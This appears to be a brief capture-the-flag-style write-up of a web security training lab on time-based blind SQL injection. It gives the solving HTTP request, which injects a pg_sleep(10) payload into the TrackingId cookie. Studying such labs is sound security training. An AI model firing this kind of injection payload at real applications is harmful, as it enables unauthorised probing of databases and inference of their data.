## Blind SQL injection with time delays

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

## Notes

- `/login`
- `/filter?category=parameter`
- Vulnerable cookie: `TrackingId`

## Resume

1. Exploit time based SQLi with `pg_sleep()`

## Solve 

In order to triger a 10s delay : 

```http
GET /filter?category=Accessories HTTP/2
Host: 0a800033048d423d81f7c55900b90039.web-security-academy.net
Cookie: TrackingId=tOCkdiOO9Tlc4LRP'||pg_sleep(10)--; session=4j62ZTkY7YqLZuhEQdrXtqef1pJTlYE2
```